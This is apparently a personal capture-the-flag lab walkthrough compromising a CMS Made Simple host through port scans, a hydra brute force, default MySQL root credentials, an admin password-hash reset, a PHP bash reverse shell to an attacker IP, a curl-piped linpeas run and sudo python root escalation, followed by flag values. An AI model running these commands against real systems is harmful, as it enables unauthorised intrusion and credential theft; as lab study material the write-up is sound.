---
tags:
  - Linux
---
Given Target: 192.168.172.74

```
rustscan 192.168.172.74
```
	PORT      STATE SERVICE REASON
	22/tcp    open  ssh     syn-ack
	80/tcp    open  http    syn-ack
	3306/tcp  open  mysql   syn-ack
	33060/tcp open  mysqlx  syn-ack

```
nmap -sC -sV -p22,80,3306,33060 -v -T4 192.168.172.74 -oN services.nmap
```
	PORT      STATE SERVICE VERSION
	22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
	| ssh-hostkey: 
	|   2048 27:21:9e:b5:39:63:e9:1f:2c:b2:6b:d3:3a:5f:31:7b (RSA)
	|   256 bf:90:8a:a5:d7:e5:de:89:e6:1a:36:a1:93:40:18:57 (ECDSA)
	|_  256 95:1f:32:95:78:08:50:45:cd:8c:7c:71:4a:d4:6c:1c (ED25519)
	80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
	|_http-generator: CMS Made Simple - Copyright (C) 2004-2020. All rights reserved.
	|_http-favicon: Unknown favicon MD5: 551E34ACF2930BF083670FA203420993
	|_http-title: Home - My CMS
	|_http-server-header: Apache/2.4.38 (Debian)
	| http-methods: 
	|_  Supported Methods: GET HEAD POST OPTIONS
	3306/tcp  open  mysql   MySQL 8.0.19
	|_ssl-date: TLS randomness does not represent time
	| mysql-info: 
	|   Protocol: 10
	|   Version: 8.0.19
	|   Thread ID: 45
	|   Capabilities flags: 65535
	|   Some Capabilities: Speaks41ProtocolNew, Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsTransactions, InteractiveClient, LongPassword, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsLoadDataLocal, SupportsCompression, LongColumnFlag, ODBCClient, SwitchToSSLAfterHandshake, IgnoreSigpipes, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
	|   Status: Autocommit
	|   Salt: ?yacCn\x1A,l\x19EK\x04Nfuh    \x1B\x1D
	|_  Auth Plugin Name: mysql_native_password
	| ssl-cert: Subject: commonName=MySQL_Server_8.0.19_Auto_Generated_Server_Certificate
	| Issuer: commonName=MySQL_Server_8.0.19_Auto_Generated_CA_Certificate
	| Public Key type: rsa
	| Public Key bits: 2048
	| Signature Algorithm: sha256WithRSAEncryption
	| Not valid before: 2020-03-25T09:30:14
	| Not valid after:  2030-03-23T09:30:14
	| MD5:   ab68:52c7:9ef3:3568:e534:a8f6:0670:3571
	|_SHA-1: 62d2:bb7c:d123:e6d4:7231:773c:0916:b2c8:05dd:3f48
	33060/tcp open  mysqlx?
	| fingerprint-strings: 
	|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
	|     Invalid message"
	|_    HY000

```
dirb http://192.168.172.74
```

---- Scanning URL: http://192.168.172.74/ ----
==> DIRECTORY: http://192.168.172.74/admin/                                      
==> DIRECTORY: http://192.168.172.74/assets/                                     
+ http://192.168.172.74/cgi-bin/ (CODE:403|SIZE:279)                             
==> DIRECTORY: http://192.168.172.74/doc/                                        
+ http://192.168.172.74/index.php (CODE:200|SIZE:19502)                          
==> DIRECTORY: http://192.168.172.74/lib/                                        
==> DIRECTORY: http://192.168.172.74/modules/                                    
+ http://192.168.172.74/phpinfo.php (CODE:200|SIZE:90299)                        
+ http://192.168.172.74/phpmyadmin (CODE:401|SIZE:461)                           
+ http://192.168.172.74/server-status (CODE:403|SIZE:279)                        
==> DIRECTORY: http://192.168.172.74/tmp/                                        
==> DIRECTORY: http://192.168.172.74/uploads/  


admin:admin fails. Trying hydra

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.172.74 http-post-form "/admin/login.php:username=^USER^&password=^PASS^:User name or password incorrect"
```

Too fast of threads or improper error message config this happens so make sure to limit threads -t
![[Pasted image 20231104134726.png]]


version CMS Made Simple version 2.2.13
```
searchsploit CMS Made Simple
```
	Exploits: No Results
	Shellcodes: No Results
	------------------------------------------------ ---------------------------------
	 Paper Title                                    |  Path
	------------------------------------------------ ---------------------------------
	CMS Made Simple v2.2.13 - Paper                 | docs/english/49947-cms-made-simp

```
nmap -sC -sV --script=mysql-audit,mysql-databases,mysql-brute,mysql-enum,mysql-dump-hashes -p3306 -T4 192.168.172.74 -oN mysql.nmap
```
	PORT     STATE SERVICE VERSION
	3306/tcp open  mysql   MySQL 8.0.19
	| mysql-brute: 
	|   Accounts: 
	|     root:root - Valid credentials
	|   Statistics: Performed 1 guesses in 1 seconds, average tps: 1.0
	|_  ERROR: The service seems to have failed or is heavily firewalled...
	| mysql-enum: 
	|   Valid usernames: 
	|     root:<empty> - Valid credentials
	|     guest:<empty> - Valid credentials
	|     netadmin:<empty> - Valid credentials
	|     user:<empty> - Valid credentials
	|     web:<empty> - Valid credentials
	|     sysadmin:<empty> - Valid credentials
	|     administrator:<empty> - Valid credentials
	|     webadmin:<empty> - Valid credentials
	|     admin:<empty> - Valid credentials
	|     test:<empty> - Valid credentials
	|_  Statistics: Performed 10 guesses in 1 seconds, average tps: 10.0
	| mysql-databases: 
	|   cmsms_db
	|   information_schema
	|   mysql
	|   performance_schema
	|_  sys

Found root:root

mysql -u root -h 192.168.172.74 -p
	the -p means using a password
	Password prompted where I enter root

Connected

show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| cmsms_db           |
	| information_schema |
	| mysql              |
	| performance_schema |
	| sys                |
	+--------------------+

MySQL [(none)]> use cmsms_db;
	Reading table information for completion of table and column names
	You can turn off this feature to get a quicker startup with -A
	Database changed
	MySQL [cmsms_db]>

MySQL [cmsms_db]> SELECT * FROM cms_users;
	+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                                                                                                                    
	| user_id | username | password                         | admin_access | first_name | last_name | email             | active | create_date         | modified_date       |                                                                                                                                                                    
	+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                                                                                                                    
	|       1 | admin    | 59f9ba27528694d9b3493dfde7709e70 |            1 |            |           | admin@mycms.local |      1 | 2020-03-25 09:38:46 | 2020-03-26 10:49:17 |                                                                                                                                                                    
	+---------+----------+----------------------------------+--------------+------------+-----------+-------------------+--------+---------------------+---------------------+                                                                                                                                                                   


admin:59f9ba27528694d9b3493dfde7709e70

crack time

Nope

Going to try to replace the password via dbeaver since cli mysql is cancer

192.168.172.74

![[Pasted image 20231104142904.png]]

Change admin's password hash to password's md5 hash

```
5f4dcc3b5aa765d61d8327deb882cf99
```

![[Pasted image 20231104143306.png]]

Apparently not raw MD5

cms dev blog on changing logins
https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery

```
update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'admin'))) where username = 'admin';
```
![[Pasted image 20231104144709.png]]

seems it worked

![[Pasted image 20231104144740.png]]


Add this to the user defined tags then set listener on kali. Wrap the bash revshell since it crashes the site normally
```
system("bash -c 'sh -i >& /dev/tcp/192.168.45.172/4444 0>&1'");
```

```
nc -nlvp 4444
```

listening on [any] 4445 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.172.74] 40518
sh: 0: can't access tty; job control turned off
$ whoami
www-data

upgrade shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```


run linpeas

```
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
	╔══════════╣ Analyzing Htpasswd Files (limit 70)
	-rw-r--r-- 1 root root 44 May 31  2020 /etc/apache2/.htpasswd                                                                                                          
	admin:$apr1$xcVPTQ1f$RSPY3ZneahnCI1a6Qr32S1
	-rw-r--r-- 1 www-data www-data 45 Jun 24  2020 /var/www/html/admin/.htpasswd
	TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=

Base 64 decode: TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=

echo TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0= | base64 -d       
	MFZG233VOI5FG2DJMVWGIQBRGIZQ====
		Turns out this is base 32 so need to decode it again
echo TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0= | base64 -d | base32 -d
	armour:Shield@123



# Priv Esc

![[Pasted image 20231104150835.png]]

now I'm Armour

Can run python 

armour@mycmsms:~$ sudo -l
sudo -l
Matching Defaults entries for armour on mycmsms:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User armour may run the following commands on mycmsms:
    (root) NOPASSWD: /usr/bin/python

```
sudo python -c 'import os; os.system("/bin/sh")'
```

![[Pasted image 20231104151015.png]]

![[Pasted image 20231104151055.png]]

970cad17211c33363eb0fd006ed3c464

must have missed local

```
find / -type f -name "local.txt" 2>/dev/null
```
![[Pasted image 20231104151219.png]]

5648c00001a702dd120c54839ae66dfb